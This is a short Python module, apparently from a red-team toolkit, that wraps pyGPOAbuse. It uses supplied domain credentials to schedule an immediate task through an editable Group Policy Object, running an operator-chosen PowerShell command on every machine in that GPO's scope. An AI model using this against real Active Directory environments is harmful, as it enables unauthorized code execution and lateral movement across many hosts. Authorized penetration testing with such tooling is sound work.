"""GPO abuse via pyGPOAbuse (opt-in, operator-driven).

Schedules an immediate task through a GPO the current principal can edit, to
obtain code execution in its scope. The operator supplies the command, so this
ships no canned payload. Requires pyGPOAbuse (pygpoabuse.py) on PATH or in CWD.
"""
import os

from .shell import stream, have
from .console import info, err


def _locate() -> list[str] | None:
    if have('pygpoabuse.py'):
        return ['pygpoabuse.py']
    for path in ('pygpoabuse.py', os.path.join('pyGPOAbuse', 'pygpoabuse.py')):
        if os.path.exists(path):
            return ['python3', path]
    return None


def gpo_abuse(domain: str, user: str, password: str, gpo_id: str,
              command: str, taskname: str = 'AutoWinTask') -> None:
    launcher = _locate()
    if launcher is None:
        err('GPO: pyGPOAbuse not found. git clone https://github.com/Hackndo/pyGPOAbuse')
        return

    info(f'GPO: scheduling task "{taskname}" via GPO {gpo_id} as {domain}\\{user}')
    rc = stream(*launcher, f'{domain}/{user}:{password}', '-gpo-id', gpo_id,
                '-powershell', '-command', command, '-taskname', taskname)
    if rc != 0:
        err(f'GPO: pyGPOAbuse exited with code {rc}')
